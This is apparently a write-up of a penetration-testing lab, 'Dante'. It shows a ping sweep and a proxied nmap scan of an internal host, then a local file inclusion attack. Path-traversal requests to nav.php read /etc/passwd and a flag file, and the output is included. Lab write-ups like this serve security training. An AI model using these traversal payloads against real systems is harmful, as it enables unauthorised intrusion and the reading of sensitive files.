# Reconnaissances
## Search for Active Host
```
root@DANTE-WEB-NIX01:~# for i in {1..255} ; do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done
```
```
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.100
172.16.1.101
172.16.1.102
```
## 172.16.1.10
### Port Scan
```
$ proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
```
```
Nmap scan report for 172.16.1.10
Host is up (0.21s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 251.73 seconds
```

Looking for the HTTP
```
proxychains firefox http://172.16.1.10
```

### Local File Inclusion
```
$ proxychains curl http://172.16.1.10/nav.php?page=../../../../etc/passwd
```
```
$ proxychains curl http://172.16.1.10/nav.php?page=../../../../etc/passwd |grep home
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:80  ...  OK
100  3068  100  3068    0     0   7704      0 --:--:-- --:--:-- --:--:--  7708
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
margaret:x:1001:1001::/home/margaret:/bin/lshell
omi:x:998:997::/home/omi:/bin/false
nxautomation:x:996:995:nxOMSAutomation:/home/nxautomation/run:/bin/bash
```
```
$ proxychains curl http://172.16.1.10/nav.php?page=../../../../home/margaret/flag.txt
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:80  ...  OK
DANTE{LF1_M@K3s_u5_lol}                            
```

